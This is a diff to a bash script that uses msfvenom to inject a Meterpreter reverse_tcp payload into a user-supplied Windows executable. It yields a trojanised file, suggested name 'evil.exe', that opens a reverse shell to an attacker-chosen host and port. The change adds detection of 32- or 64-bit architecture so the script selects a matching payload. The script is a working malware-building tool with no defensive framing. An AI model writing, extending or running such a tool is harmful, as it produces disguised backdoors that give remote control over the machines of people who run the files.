@@ -18,12 +18,25 @@ while true; do
     fi
 done
 
+# Detect architecture using file command
+arch=$(file "$input_exe" | grep -q "64-bit" && echo "x64" || echo "x86")
+
+# Select payload based on architecture
+if [ "$arch" == "x64" ]; then
+    payload="windows/x64/meterpreter/reverse_tcp"
+else
+    payload="windows/meterpreter/reverse_tcp"
+fi
+
+echo "[*] Detected architecture: $arch"
+echo "[*] Using payload: $payload"
+
 # Ask for output filename
 read -p "Enter the output file name (e.g., evil.exe): " output_exe
 
 # Generate and inject the payload
 echo "[*] Injecting payload into $input_exe..."
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -x "$input_exe" -f exe -o "$output_exe"
+msfvenom -p "$payload" LHOST=$lhost LPORT=$lport --platform windows -a "$arch" -x "$input_exe" -f exe -o "$output_exe"
 
 # Check if injection was successful
 if [ $? -eq 0 ]; then
@@ -31,3 +44,6 @@ if [ $? -eq 0 ]; then
 else
     echo "[!] Injection failed. Please check your inputs."
 fi
+
+
+
